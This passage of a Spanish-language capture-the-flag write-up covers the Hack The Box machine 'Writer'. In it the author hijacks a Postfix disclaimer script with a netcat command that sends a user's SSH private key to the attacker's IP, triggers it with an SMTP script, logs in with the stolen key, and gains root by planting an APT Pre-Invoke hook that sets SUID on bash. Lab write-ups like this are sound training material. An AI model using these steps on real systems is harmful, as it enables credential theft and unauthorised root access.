</span></span></code></pre></div><p>Lo que hace el <em>script</em> es añadir un texto de aviso legal (<em>disclaimer</em>) a todos los correos enviados desde <code>root@writer.htb</code> o <code>kyle@writer.htb</code>, como se muestra a continuación:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>kyle@writer:~$ cat /etc/postfix/disclaimer_addresses
</span></span><span style=display:flex><span>root@writer.htb
</span></span><span style=display:flex><span>kyle@writer.htb
</span></span><span style=display:flex><span>kyle@writer:~$ cat /etc/postfix/disclaimer.txt
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>--
</span></span><span style=display:flex><span>This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed.
</span></span><span style=display:flex><span>If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the
</span></span><span style=display:flex><span>individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately
</span></span><span style=display:flex><span>by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified
</span></span><span style=display:flex><span>that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Writer.HTB
</span></span></code></pre></div><p>Entonces podemos deducir que el <em>script</em> se ejecuta cada vez que se envía un correo mediante SMTP. Además, podemos modificar el <em>script</em> porque estamos en el grupo <code>filter</code>.</p><p>Después de notar que <code>john</code> tiene un directorio <code>.ssh</code>, podemos simplemente transferir su clave privada a nuestra máquina de atacante poniendo el comando <code>nc 10.10.17.44 4444 &lt; /home/john/.ssh/id_rsa</code> en el archivo <code>/etc/postfix/disclaimer</code>.</p><p>Para que el <em>script</em> se ejecute, es necesario enviar un correo. Para ello, podemos utilizar un simple <em>script</em> de Python como el siguiente (encontrado <a href=https://www.tutorialspoint.com/python/python_sending_email.htm>aquí</a>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> smtplib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sender <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;kyle@writer.htb&#39;</span>
</span></span><span style=display:flex><span>receivers <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;john@writer.htb&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>From: Kyle &lt;kyle@writer.htb&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>To: John &lt;john@writer.htb&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Subject: SMTP e-mail test
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>This is a test e-mail message.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>[<span style=color:#ae81ff>1</span>:]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    smtp_object <span style=color:#f92672>=</span> smtplib<span style=color:#f92672>.</span>SMTP(<span style=color:#e6db74>&#39;localhost&#39;</span>)
</span></span><span style=display:flex><span>    smtp_object<span style=color:#f92672>.</span>sendmail(sender, receivers, message)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;Successfully sent email&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> smtplib<span style=color:#f92672>.</span>SMTPException:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;Error: unable to send email&#39;</span>)
</span></span></code></pre></div><p>Y obtenemos la clave privada de <code>john</code>. Con esto conseguimos acceso por ssh:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>4444</span> &gt; id_rsa
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::4444
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.101.
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.101:38630.
</span></span><span style=display:flex><span>^C
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ ssh -i id_rsa john@10.10.11.101
</span></span><span style=display:flex><span>john@writer:~$
</span></span></code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios</h2><p>Si listamos procesos con <code>ps</code>, vemos que existe una tarea Cron ejecutada como <code>root</code> que realiza un <code>apt-get update</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>john@writer:~$ ps -faux | grep root
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>root       31467  0.0  0.0   8356  3400 ?        S    19:52   0:00  _ /usr/sbin/CRON -f
</span></span><span style=display:flex><span>root       31475  0.0  0.0   2608   608 ?        Ss   19:52   0:00      _ /bin/sh -c /usr/bin/apt-get update
</span></span><span style=display:flex><span>root       31479  0.1  0.2  16204  8524 ?        S    19:52   0:00          _ /usr/bin/apt-get update
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>De nuevo, podemos ver si pertenecemos a algún grupo, y vemos que somos parte del grupo <code>management</code>, cuyos miembros pueden escribir en <code>/etc/apt/apt.conf.d</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>john@writer:~$ id
</span></span><span style=display:flex><span>uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
</span></span><span style=display:flex><span>john@writer:~$ find / -group management 2&gt;/dev/null
</span></span><span style=display:flex><span>/etc/apt/apt.conf.d
</span></span><span style=display:flex><span>john@writer:~$ cd /etc/apt/apt.conf.d
</span></span><span style=display:flex><span>john@writer:~$ cat /etc/apt/apt.conf.d/* | grep APT::
</span></span><span style=display:flex><span>APT::Periodic::Update-Package-Lists &#34;1&#34;;
</span></span><span style=display:flex><span>APT::Periodic::Download-Upgradeable-Packages &#34;0&#34;;
</span></span><span style=display:flex><span>APT::Periodic::AutocleanInterval &#34;0&#34;;
</span></span><span style=display:flex><span>APT::Update::Post-Invoke-Success {&#34;touch /var/lib/apt/periodic/update-success-stamp 2&gt;/dev/null || true&#34;;};
</span></span><span style=display:flex><span>APT::Archives::MaxAge &#34;30&#34;;
</span></span><span style=display:flex><span>APT::Archives::MinAge &#34;2&#34;;
</span></span><span style=display:flex><span>APT::Archives::MaxSize &#34;500&#34;;
</span></span><span style=display:flex><span>APT::Update::Post-Invoke-Success {
</span></span><span style=display:flex><span>APT::Update::Post-Invoke-Success {
</span></span><span style=display:flex><span>APT::Update::Post-Invoke-Success {&#34;/usr/lib/update-notifier/update-motd-updates-available 2&gt;/dev/null || true&#34;;};
</span></span></code></pre></div><p>Después de ver los archivos que hay en el directorio y buscando <a href=https://gtfobins.github.io/gtfobins/apt-get/><code>apt-get</code> en GTFObins</a>, podemos poner un comando para que se ejecute antes de <code>apt-get update</code>. Por ejemplo, podemos darle permisos SUID a <code>/bin/bash</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>john@writer:~$ ls -l /bin/bash
</span></span><span style=display:flex><span>-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
</span></span><span style=display:flex><span>john@writer:~$ echo &#39;APT::Update::Pre-Invoke {&#34;chmod 4755 /bin/bash&#34;;};&#39; &gt; /etc/apt/apt.conf.d/01asdf
</span></span></code></pre></div><p>Y después de un minuto aproximadamente tenemos acceso como <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>john@writer:~$ ls -l /bin/bash
</span></span><span style=display:flex><span>-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
</span></span><span style=display:flex><span>john@writer:~$ bash -p
</span></span><span style=display:flex><span>bash-5.0# chmod 0755 /bin/bash
</span></span><span style=display:flex><span>bash-5.0# cat /root/root.txt
</span></span><span style=display:flex><span>f7e5f21393414b3bb227ee32fdae67a
</span></span></code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#encontrando-una-inyección-de-código-sql>Encontrando una inyección de código SQL</a></li><li><a href=#leyendo-archivos-mediante-sqli>Leyendo archivos mediante SQLi</a></li><li><a href=#análisis-del-código-python>Análisis del código Python</a></li><li><a href=#enumeración-por-smb>Enumeración por SMB</a></li><li><a href=#intrusión-en-la-máquina>Intrusión en la máquina</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#movimiento-lateral-al-usuario-john>Movimiento lateral al usuario <code>john</code></a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>